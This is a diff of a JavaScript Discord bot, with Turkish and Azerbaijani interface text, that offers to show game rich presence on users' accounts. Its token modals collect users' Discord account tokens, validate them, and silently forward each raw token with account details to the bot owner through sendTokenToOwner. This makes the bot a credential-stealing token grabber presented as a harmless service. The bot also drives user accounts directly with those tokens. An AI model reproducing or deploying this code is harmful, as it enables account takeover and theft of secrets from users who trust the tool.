@@ -89,7 +89,7 @@ const OWNER_ID = '1184518857679962186';
 // Hazır oyunları Discord API + daxili siyahı ilə birləşdirən funksiya
 async function getReadyGames() {
   const now = Date.now();
-  if (cachedGames.length > 0 && now - lastGamesFetch < 6 * 60 * 60 * 1000) {
+  if (cachedGames.length > READY_GAMES.length && now - lastGamesFetch < 6 * 60 * 60 * 1000) {
     return cachedGames;
   }
 
@@ -99,7 +99,13 @@ async function getReadyGames() {
   }
 
   try {
-    const res = await fetch('https://discord.com/api/v10/applications/detectable');
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 3000);
+    const res = await fetch('https://discord.com/api/v10/applications/detectable', {
+      signal: controller.signal
+    });
+    clearTimeout(timeout);
+
     if (res.ok) {
       const data = await res.json();
       if (Array.isArray(data)) {
@@ -120,10 +126,11 @@ async function getReadyGames() {
   return cachedGames;
 }
 
-client.once('ready', async () => {
+client.once('ready', () => {
   console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
-  await getReadyGames();
-  console.log(`Hazır oyun siyahısı yükləndi: ${cachedGames.length} oyun`);
+  getReadyGames().then(() => {
+    console.log(`Hazır oyun bazası yükləndi: ${cachedGames.length} oyun`);
+  });
 
   client.user.setActivity({
     name: 'powered by Fronzyy',
@@ -347,360 +354,367 @@ client.on('messageCreate', async (message) => {
 client.on('interactionCreate', async (interaction) => {
   const userId = interaction.user.id;
 
-  // --- 1. BAŞLAT BUTONU -> HESAP SEÇİMİ ---
-  if (interaction.isButton() && interaction.customId === 'start_rpc') {
-    const tokens = userTokens.get(userId);
-    if (!tokens || tokens.length === 0) {
-      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
+  try {
+    // --- 1. BAŞLAT BUTONU -> HESAP SEÇİMİ ---
+    if (interaction.isButton() && interaction.customId === 'start_rpc') {
+      const tokens = userTokens.get(userId);
+      if (!tokens || tokens.length === 0) {
+        return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
+      }
+
+      const selectMenu = new StringSelectMenuBuilder()
+        .setCustomId('select_rpc_account')
+        .setPlaceholder('RPC uygulanacak hesabı seçin...')
+        .addOptions([
+          { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara RPC uygular' },
+          ...tokens.map((t, index) => ({
+            label: `${t.name} (${t.username})`,
+            value: index.toString(),
+            description: `Seçilen hesap: ${t.name}`
+          }))
+        ]);
+
+      const row = new ActionRowBuilder().addComponents(selectMenu);
+      await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
     }
 
-    const selectMenu = new StringSelectMenuBuilder()
-      .setCustomId('select_rpc_account')
-      .setPlaceholder('RPC uygulanacak hesabı seçin...')
-      .addOptions([
-        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara RPC uygular' },
-        ...tokens.map((t, index) => ({
-          label: `${t.name} (${t.username})`,
-          value: index.toString(),
-          description: `Seçilen hesap: ${t.name}`
-        }))
-      ]);
+    // --- 2. HESAP SEÇİLDİKTEN SONRA -> ANINDA HAZIR OYUN MODALI ---
+    if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
+      const selectedAccountValue = interaction.values[0];
 
-    const row = new ActionRowBuilder().addComponents(selectMenu);
-    await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
-  }
+      const modal = new ModalBuilder()
+        .setCustomId(`ready_game_modal_${selectedAccountValue}`)
+        .setTitle('Hazır Oyun Seç');
 
-  // --- 2. HESAP SEÇİLDİKTEN SONRA -> HAZIR OYUN SEÇİM / ARAMA ---
-  if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
-    const selectedAccountValue = interaction.values[0];
+      const gameFilterInput = new TextInputBuilder()
+        .setCustomId('ready_game_filter')
+        .setLabel('Hazır oyun adı yazın (boş bırakırsanız liste gelir)')
+        .setPlaceholder('Örn: Minecraft, Valorant, GTA...')
+        .setStyle(TextInputStyle.Short)
+        .setRequired(false);
 
-    const modal = new ModalBuilder()
-      .setCustomId(`ready_game_modal_${selectedAccountValue}`)
-      .setTitle('Hazır Oyun Seç');
-
-    const gameFilterInput = new TextInputBuilder()
-      .setCustomId('ready_game_filter')
-      .setLabel('Hazır oyun adı yazın (boş bırakırsanız liste gelir)')
-      .setPlaceholder('Örn: Minecraft, Valorant, GTA...')
-      .setStyle(TextInputStyle.Short)
-      .setRequired(false);
-
-    modal.addComponents(new ActionRowBuilder().addComponents(gameFilterInput));
-    await interaction.showModal(modal);
-  }
-
-  // --- 3. HAZIR OYUN LİSTESİ MENÜSÜ ---
-  if (interaction.isModalSubmit() && interaction.customId.startsWith('ready_game_modal_')) {
-    const selectedAccountValue = interaction.customId.replace('ready_game_modal_', '');
-    const filterText = interaction.fields.getTextInputValue('ready_game_filter').trim().toLowerCase();
-
-    await interaction.deferReply({ ephemeral: true });
-
-    const games = await getReadyGames();
-    const matchedGames = filterText
-      ? games.filter(g => g.name.toLowerCase().includes(filterText))
-      : games;
-
-    const listToShow = matchedGames.slice(0, 25);
-
-    if (listToShow.length === 0) {
-      return interaction.editReply({
-        content: `❌ **"${filterText}"** ile eşleşen hazır oyun bulunamadı.`
-      });
+      modal.addComponents(new ActionRowBuilder().addComponents(gameFilterInput));
+      await interaction.showModal(modal);
     }
 
-    gameChoiceCache.set(userId, listToShow);
+    // --- 3. HAZIR OYUN LİSTESİ MENÜSÜ ---
+    if (interaction.isModalSubmit() && interaction.customId.startsWith('ready_game_modal_')) {
+      const selectedAccountValue = interaction.customId.replace('ready_game_modal_', '');
+      const filterText = interaction.fields.getTextInputValue('ready_game_filter').trim().toLowerCase();
 
-    const gameMenu = new StringSelectMenuBuilder()
-      .setCustomId(`pick_ready_game_${selectedAccountValue}`)
-      .setPlaceholder('Hazır oyun listesinden seçin...')
-      .addOptions(
-        listToShow.map((game, idx) => ({
-          label: game.name.slice(0, 100),
-          value: String(idx),
-          description: `Hazır Oyun (${game.id})`.slice(0, 100),
-          emoji: '🎮'
-        }))
-      );
+      await interaction.deferReply({ ephemeral: true });
 
-    const row = new ActionRowBuilder().addComponents(gameMenu);
+      const games = cachedGames.length > 0 ? cachedGames : await getReadyGames();
+      const matchedGames = filterText
+        ? games.filter(g => g.name.toLowerCase().includes(filterText))
+        : games;
 
-    await interaction.editReply({
-      content: `🎮 **${matchedGames.length}** hazır oyun bulundu. RPC yapmak istediğiniz hazır oyunu seçin:`,
-      components: [row]
-    });
-  }
+      const listToShow = matchedGames.slice(0, 25);
 
-  // --- 4. SEÇİLEN HAZIR OYUN İLE RPC BAŞLAT ---
-  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('pick_ready_game_')) {
-    const selectedAccountValue = interaction.customId.replace('pick_ready_game_', '');
-    const gameIdx = parseInt(interaction.values[0], 10);
-
-    const choices = gameChoiceCache.get(userId) || [];
-    const selectedGame = choices[gameIdx];
-
-    if (!selectedGame) {
-      return interaction.update({
-        content: '⚠️ Oyun seçimi zaman aşımına uğradı. Lütfen **Başlat** butonuna tekrar basın.',
-        components: []
-      });
-    }
-
-    const tokens = userTokens.get(userId) || [];
-    const targetTokens = selectedAccountValue === 'all_accounts'
-      ? tokens
-      : [tokens[parseInt(selectedAccountValue, 10)]].filter(Boolean);
-
-    if (targetTokens.length === 0) {
-      return interaction.update({
-        content: '⚠️ Hesap bulunamadı!',
-        components: []
-      });
-    }
-
-    await interaction.update({
-      content: `⏳ **${selectedGame.name}** hazır oyun RPC başlatılıyor...`,
-      components: []
-    });
-
-    if (!activeRPCs.has(userId)) {
-      activeRPCs.set(userId, []);
-    }
-
-    let startedCount = 0;
-    for (const tObj of targetTokens) {
-      const session = await startReadyGameRPC(tObj.token, tObj.name, selectedGame);
-      if (session && typeof session.stop === 'function') {
-        activeRPCs.get(userId).push({
-          token: tObj.token,
-          name: tObj.name,
-          username: tObj.username,
-          stop: session.stop
+      if (listToShow.length === 0) {
+        return interaction.editReply({
+          content: `❌ **"${filterText}"** ile eşleşen hazır oyun bulunamadı.`
         });
-        startedCount++;
       }
+
+      gameChoiceCache.set(userId, listToShow);
+
+      const gameMenu = new StringSelectMenuBuilder()
+        .setCustomId(`pick_ready_game_${selectedAccountValue}`)
+        .setPlaceholder('Hazır oyun listesinden seçin...')
+        .addOptions(
+          listToShow.map((game, idx) => ({
+            label: game.name.slice(0, 100),
+            value: String(idx),
+            description: `Hazır Oyun (${game.id})`.slice(0, 100),
+            emoji: '🎮'
+          }))
+        );
+
+      const row = new ActionRowBuilder().addComponents(gameMenu);
+
+      await interaction.editReply({
+        content: `🎮 **${matchedGames.length}** hazır oyun bulundu. RPC yapmak istediğiniz hazır oyunu seçin:`,
+        components: [row]
+      });
     }
 
-    await interaction.editReply({
-      content: `🚀 Seçilen **${startedCount}** hesap için hazır oyun RPC başlatıldı: **${selectedGame.name}**`
-    });
-  }
+    // --- 4. SEÇİLEN HAZIR OYUN İLE RPC BAŞLAT ---
+    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('pick_ready_game_')) {
+      const selectedAccountValue = interaction.customId.replace('pick_ready_game_', '');
+      const gameIdx = parseInt(interaction.values[0], 10);
 
-  // --- 5. TOKEN EKLE BUTONU ---
-  if (interaction.isButton() && interaction.customId === 'add_token') {
-    const modal = new ModalBuilder()
-      .setCustomId('token_modal')
-      .setTitle('Discord Token Ekle');
+      const choices = gameChoiceCache.get(userId) || [];
+      const selectedGame = choices[gameIdx];
 
-    const tokenInput = new TextInputBuilder()
-      .setCustomId('token_input')
-      .setLabel('Discord Tokeninizi girin')
-      .setStyle(TextInputStyle.Short)
-      .setRequired(true);
+      if (!selectedGame) {
+        return interaction.update({
+          content: '⚠️ Oyun seçimi zaman aşımına uğradı. Lütfen **Başlat** butonuna tekrar basın.',
+          components: []
+        });
+      }
 
-    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
-    await interaction.showModal(modal);
-  }
+      const tokens = userTokens.get(userId) || [];
+      const targetTokens = selectedAccountValue === 'all_accounts'
+        ? tokens
+        : [tokens[parseInt(selectedAccountValue, 10)]].filter(Boolean);
 
-  // --- 5.1. TOPLU TOKEN EKLE BUTONU ---
-  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
-    const modal = new ModalBuilder()
-      .setCustomId('bulk_token_modal')
-      .setTitle('Toplu Discord Token Ekle');
+      if (targetTokens.length === 0) {
+        return interaction.update({
+          content: '⚠️ Hesap bulunamadı!',
+          components: []
+        });
+      }
 
-    const tokenInput = new TextInputBuilder()
-      .setCustomId('bulk_token_input')
-      .setLabel('Discord Tokenlerini girin')
-      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
-      .setStyle(TextInputStyle.Paragraph)
-      .setRequired(true);
-
-    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
-    await interaction.showModal(modal);
-  }
-
-  // --- 5.2. TOKEN SİL PANELİ ---
-  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
-    const tokens = userTokens.get(userId);
-    if (!tokens || tokens.length === 0) {
-      return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
-    }
-
-    const selectMenu = new StringSelectMenuBuilder()
-      .setCustomId('select_remove_account')
-      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
-      .addOptions([
-        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '❌' },
-        ...tokens.map((t, index) => ({
-          label: `${t.name} (${t.username})`,
-          value: index.toString(),
-          description: 'Bu hesabı sil',
-          emoji: '❌'
-        }))
-      ]);
-
-    const row = new ActionRowBuilder().addComponents(selectMenu);
-    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
-  }
-
-  // --- 6. TEK TOKEN MODAL CEVABI ---
-  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
-    const token = interaction.fields.getTextInputValue('token_input').trim();
-    await interaction.deferReply({ ephemeral: true });
-
-    try {
-      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
-        headers: { 'Authorization': token }
+      await interaction.update({
+        content: `⏳ **${selectedGame.name}** hazır oyun RPC başlatılıyor...`,
+        components: []
       });
 
-      if (!userRes.ok) {
-        return interaction.editReply({ content: '❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.' });
+      if (!activeRPCs.has(userId)) {
+        activeRPCs.set(userId, []);
       }
 
-      const userData = await userRes.json();
-      const globalName = userData.global_name || userData.username;
-      const username = userData.username;
-
-      if (!userTokens.has(userId)) {
-        userTokens.set(userId, []);
+      let startedCount = 0;
+      for (const tObj of targetTokens) {
+        const session = await startReadyGameRPC(tObj.token, tObj.name, selectedGame);
+        if (session && typeof session.stop === 'function') {
+          activeRPCs.get(userId).push({
+            token: tObj.token,
+            name: tObj.name,
+            username: tObj.username,
+            stop: session.stop
+          });
+          startedCount++;
+        }
       }
 
-      const existingList = userTokens.get(userId);
-      if (!existingList.some(t => t.token === token)) {
-        existingList.push({ token, name: globalName, username });
+      await interaction.editReply({
+        content: `🚀 Seçilen **${startedCount}** hesap için hazır oyun RPC başlatıldı: **${selectedGame.name}**`
+      });
+    }
+
+    // --- 5. TOKEN EKLE BUTONU ---
+    if (interaction.isButton() && interaction.customId === 'add_token') {
+      const modal = new ModalBuilder()
+        .setCustomId('token_modal')
+        .setTitle('Discord Token Ekle');
+
+      const tokenInput = new TextInputBuilder()
+        .setCustomId('token_input')
+        .setLabel('Discord Tokeninizi girin')
+        .setStyle(TextInputStyle.Short)
+        .setRequired(true);
+
+      modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
+      await interaction.showModal(modal);
+    }
+
+    // --- 5.1. TOPLU TOKEN EKLE BUTONU ---
+    if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
+      const modal = new ModalBuilder()
+        .setCustomId('bulk_token_modal')
+        .setTitle('Toplu Discord Token Ekle');
+
+      const tokenInput = new TextInputBuilder()
+        .setCustomId('bulk_token_input')
+        .setLabel('Discord Tokenlerini girin')
+        .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
+        .setStyle(TextInputStyle.Paragraph)
+        .setRequired(true);
+
+      modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
+      await interaction.showModal(modal);
+    }
+
+    // --- 5.2. TOKEN SİL PANELİ ---
+    if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
+      const tokens = userTokens.get(userId);
+      if (!tokens || tokens.length === 0) {
+        return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
       }
 
-      await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
-      await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
-    } catch (err) {
-      await interaction.editReply({ content: '❌ Token eklenirken bir hata oluştu.' });
+      const selectMenu = new StringSelectMenuBuilder()
+        .setCustomId('select_remove_account')
+        .setPlaceholder('Silmek istediğiniz hesabı seçin...')
+        .addOptions([
+          { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '❌' },
+          ...tokens.map((t, index) => ({
+            label: `${t.name} (${t.username})`,
+            value: index.toString(),
+            description: 'Bu hesabı sil',
+            emoji: '❌'
+          }))
+        ]);
+
+      const row = new ActionRowBuilder().addComponents(selectMenu);
+      await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
     }
-  }
 
-  // --- 6.1. TOPLU TOKEN MODAL CEVABI ---
-  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
-    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
-    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);
+    // --- 6. TEK TOKEN MODAL CEVABI ---
+    if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
+      const token = interaction.fields.getTextInputValue('token_input').trim();
+      await interaction.deferReply({ ephemeral: true });
 
-    if (tokens.length === 0) {
-      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
-    }
-
-    await interaction.deferReply({ ephemeral: true });
-
-    if (!userTokens.has(userId)) {
-      userTokens.set(userId, []);
-    }
-    const existingList = userTokens.get(userId);
-
-    let successCount = 0;
-    let failCount = 0;
-    const addedNames = [];
-
-    for (const token of tokens) {
       try {
         const userRes = await fetch('https://discord.com/api/v9/users/@me', {
           headers: { 'Authorization': token }
         });
 
-        if (userRes.ok) {
-          const userData = await userRes.json();
-          const globalName = userData.global_name || userData.username;
-          const username = userData.username;
+        if (!userRes.ok) {
+          return interaction.editReply({ content: '❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.' });
+        }
 
-          if (!existingList.some(t => t.token === token)) {
-            existingList.push({ token, name: globalName, username });
+        const userData = await userRes.json();
+        const globalName = userData.global_name || userData.username;
+        const username = userData.username;
+
+        if (!userTokens.has(userId)) {
+          userTokens.set(userId, []);
+        }
+
+        const existingList = userTokens.get(userId);
+        if (!existingList.some(t => t.token === token)) {
+          existingList.push({ token, name: globalName, username });
+        }
+
+        await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
+        await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
+      } catch (err) {
+        await interaction.editReply({ content: '❌ Token eklenirken bir hata oluştu.' });
+      }
+    }
+
+    // --- 6.1. TOPLU TOKEN MODAL CEVABI ---
+    if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
+      const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
+      const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);
+
+      if (tokens.length === 0) {
+        return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
+      }
+
+      await interaction.deferReply({ ephemeral: true });
+
+      if (!userTokens.has(userId)) {
+        userTokens.set(userId, []);
+      }
+      const existingList = userTokens.get(userId);
+
+      let successCount = 0;
+      let failCount = 0;
+      const addedNames = [];
+
+      for (const token of tokens) {
+        try {
+          const userRes = await fetch('https://discord.com/api/v9/users/@me', {
+            headers: { 'Authorization': token }
+          });
+
+          if (userRes.ok) {
+            const userData = await userRes.json();
+            const globalName = userData.global_name || userData.username;
+            const username = userData.username;
+
+            if (!existingList.some(t => t.token === token)) {
+              existingList.push({ token, name: globalName, username });
+            }
+
+            addedNames.push(`${globalName} (${username})`);
+            successCount++;
+
+            await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
+          } else {
+            failCount++;
           }
-
-          addedNames.push(`${globalName} (${username})`);
-          successCount++;
-
-          await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
-        } else {
+        } catch (err) {
           failCount++;
         }
-      } catch (err) {
-        failCount++;
       }
-    }
 
-    await interaction.editReply({
-      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}`
-    });
-  }
-
-  // --- 6.2. TOKEN SİLME SEÇİM İŞLEMİ ---
-  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
-    const selectedValue = interaction.values[0];
-    const tokens = userTokens.get(userId);
-
-    if (!tokens) {
-      return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
-    }
-
-    if (selectedValue === 'clear_all_tokens') {
-      userTokens.set(userId, []);
-      return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
-    } else {
-      const index = parseInt(selectedValue, 10);
-      const removedAccount = tokens.splice(index, 1)[0];
-      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
-    }
-  }
-
-  // --- 7. DURDUR BUTONU -> HESAP SEÇİMİ ---
-  if (interaction.isButton() && interaction.customId === 'stop_all') {
-    const userRPCs = activeRPCs.get(userId) || [];
-
-    if (userRPCs.length === 0) {
-      return interaction.reply({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', ephemeral: true });
-    }
-
-    const selectMenu = new StringSelectMenuBuilder()
-      .setCustomId('select_stop_rpc_account')
-      .setPlaceholder('RPC durdurulacak hesabı seçin...')
-      .addOptions([
-        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Aktif olan bütün hesapların RPC-sini durdurur', emoji: '❌' },
-        ...userRPCs.map((r, index) => ({
-          label: `${r.name} (${r.username})`,
-          value: index.toString(),
-          description: 'Bu hesabın RPC-sini durdur',
-          emoji: '❌'
-        }))
-      ]);
-
-    const row = new ActionRowBuilder().addComponents(selectMenu);
-    await interaction.reply({ content: 'RPC durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
-  }
-
-  // --- 7.1. DURDUR HESAP SEÇİMİ İŞLEMİ ---
-  if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_rpc_account') {
-    const selectedValue = interaction.values[0];
-    const userRPCs = activeRPCs.get(userId) || [];
-
-    if (userRPCs.length === 0) {
-      return interaction.update({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', components: [] });
-    }
-
-    if (selectedValue === 'all_accounts') {
-      for (const rpcItem of userRPCs) {
-        if (rpcItem && typeof rpcItem.stop === 'function') {
-          rpcItem.stop();
-        }
-      }
-      activeRPCs.set(userId, []);
-      return interaction.update({ content: '🛑 Hesaplarınızdaki bütün aktif RPC süreçleri durduruldu.', components: [] });
-    } else {
-      const index = parseInt(selectedValue, 10);
-      const removedRPC = userRPCs.splice(index, 1)[0];
-      if (removedRPC && typeof removedRPC.stop === 'function') {
-        removedRPC.stop();
-      }
-      activeRPCs.set(userId, userRPCs);
-      return interaction.update({
-        content: `🛑 **${removedRPC ? `${removedRPC.name} (${removedRPC.username})` : 'Seçilen hesap'}** için aktif RPC durduruldu.`,
-        components: []
+      await interaction.editReply({
+        content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}`
       });
+    }
+
+    // --- 6.2. TOKEN SİLME SEÇİM İŞLEMİ ---
+    if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
+      const selectedValue = interaction.values[0];
+      const tokens = userTokens.get(userId);
+
+      if (!tokens) {
+        return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
+      }
+
+      if (selectedValue === 'clear_all_tokens') {
+        userTokens.set(userId, []);
+        return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
+      } else {
+        const index = parseInt(selectedValue, 10);
+        const removedAccount = tokens.splice(index, 1)[0];
+        return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
+      }
+    }
+
+    // --- 7. DURDUR BUTONU -> HESAP SEÇİMİ ---
+    if (interaction.isButton() && interaction.customId === 'stop_all') {
+      const userRPCs = activeRPCs.get(userId) || [];
+
+      if (userRPCs.length === 0) {
+        return interaction.reply({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', ephemeral: true });
+      }
+
+      const selectMenu = new StringSelectMenuBuilder()
+        .setCustomId('select_stop_rpc_account')
+        .setPlaceholder('RPC durdurulacak hesabı seçin...')
+        .addOptions([
+          { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Aktif olan bütün hesapların RPC-sini durdurur', emoji: '❌' },
+          ...userRPCs.map((r, index) => ({
+            label: `${r.name} (${r.username})`,
+            value: index.toString(),
+            description: 'Bu hesabın RPC-sini durdur',
+            emoji: '❌'
+          }))
+        ]);
+
+      const row = new ActionRowBuilder().addComponents(selectMenu);
+      await interaction.reply({ content: 'RPC durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
+    }
+
+    // --- 7.1. DURDUR HESAP SEÇİMİ İŞLEMİ ---
+    if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_rpc_account') {
+      const selectedValue = interaction.values[0];
+      const userRPCs = activeRPCs.get(userId) || [];
+
+      if (userRPCs.length === 0) {
+        return interaction.update({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', components: [] });
+      }
+
+      if (selectedValue === 'all_accounts') {
+        for (const rpcItem of userRPCs) {
+          if (rpcItem && typeof rpcItem.stop === 'function') {
+            rpcItem.stop();
+          }
+        }
+        activeRPCs.set(userId, []);
+        return interaction.update({ content: '🛑 Hesaplarınızdaki bütün aktif RPC süreçleri durduruldu.', components: [] });
+      } else {
+        const index = parseInt(selectedValue, 10);
+        const removedRPC = userRPCs.splice(index, 1)[0];
+        if (removedRPC && typeof removedRPC.stop === 'function') {
+          removedRPC.stop();
+        }
+        activeRPCs.set(userId, userRPCs);
+        return interaction.update({
+          content: `🛑 **${removedRPC ? `${removedRPC.name} (${removedRPC.username})` : 'Seçilen hesap'}** için aktif RPC durduruldu.`,
+          components: []
+        });
+      }
+    }
+  } catch (err) {
+    console.error('Interaction xətası:', err);
+    if (!interaction.replied && !interaction.deferred) {
+      await interaction.reply({ content: '❌ Sorğu işlənərkən xəta baş verdi.', ephemeral: true }).catch(() => {});
     }
   }
 });
